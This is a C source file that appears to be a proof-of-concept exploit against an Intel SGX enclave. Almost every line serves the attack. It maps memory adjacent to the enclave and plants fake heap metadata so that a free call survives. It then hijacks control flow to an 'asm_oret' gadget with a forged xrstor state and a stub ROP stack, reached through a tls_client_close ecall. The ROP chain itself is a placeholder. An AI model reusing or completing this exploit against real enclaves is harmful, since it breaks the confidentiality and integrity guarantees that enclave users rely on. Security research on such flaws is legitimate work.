#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#include "sgx_edger8r.h" // sgx_ecall
#include "sgx_urts.h" // sgx_create_enclave

sgx_enclave_id_t global_eid = 0;

int initialize_enclave(const char* enclave_filename)
{
    if (global_eid != 0)
        return 0;

    sgx_launch_token_t token = {0};
    int updated;
    sgx_status_t ret = sgx_create_enclave(enclave_filename, SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL);
    if (ret != SGX_SUCCESS)
        return -1;

    return 0;
}

void* enclave_base() {
	FILE* fp = fopen("/proc/self/smaps", "r");
	if (fp == 0) return 0;
	char* line = 0; size_t len = 0; ssize_t read;

	// first isgx page (CODE, r_x)
	while((read = getline(&line, &len, fp)) != -1)
		if (strstr(line, "isgx"))
			return (void*)strtoll(line, NULL, 16);
}

int call_ecall(int ecall_idx, void* ms)
{
    sgx_ecall(global_eid, ecall_idx, 0, ms);
}

int main(int argc, char** argv)
{
    if (initialize_enclave("enclave.signed.so") < 0)
        return -1;

    uint64_t* base = (uint64_t*) enclave_base();
    void* page = mmap(base - 0x1000/8, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    printf("%p %p\n", base, page);

    size_t BUFFER_SIZE = 0x4c8 / sizeof(uint64_t);

    uint64_t* buffer = (uint64_t*) base - BUFFER_SIZE + 1;
    for (uint64_t i = 0; i < BUFFER_SIZE - 1; ++i)
    	buffer[i] = i << 32;

    // (1) survive free call
    buffer[0] = (uint64_t) (buffer + 5);
    buffer[1] = (uint64_t) (buffer + 10);
    buffer[9] = 0;
    buffer[8] = (uint64_t) (buffer + 20);
    buffer[20+0x40/8] = 0;
    buffer[5] = (uint64_t) (buffer + 30) + 1;

    // (2) jmp target: asm_oret+13
    // buffer[0x1e] = 0xDEADC0DE;
    buffer[0x1e] = (uint64_t) base + 0x2235de + 13; // asm_oret+13

    static uint64_t new_stack[0x100];
    static uint64_t xregs_restore[]  __attribute__ ((aligned(64))) = {
    	// (4) SYNTHETIC STATE (rstor)
        0x37f, 0x0, 0x0, 0xffff00001f80,
        0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
        0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
        0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
        0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8000000000000000,
        0x0, 0x0, 0x0, 0x0, 0x0, 0x0, // 0x240: end of systhetic state

        // (6) ROP stack:
        // pop rbp, ret
        0x0, 0xDEADC0DE, // ... ROP chain (7)
    };
    new_stack[0x98/8] = (uint64_t) xregs_restore; // (4) xrstor
    new_stack[0x58/8] = (uint64_t) xregs_restore + 0x240; // (5) final rsp

    new_stack[0x38/8] = 0x1;
    new_stack[0x38/8] = 0x2;

    uint64_t ms[2] = { (uint64_t) buffer, (uint64_t) new_stack /* (3) rstor stack */};
    call_ecall(5, ms); // tls_client_close(session)
}
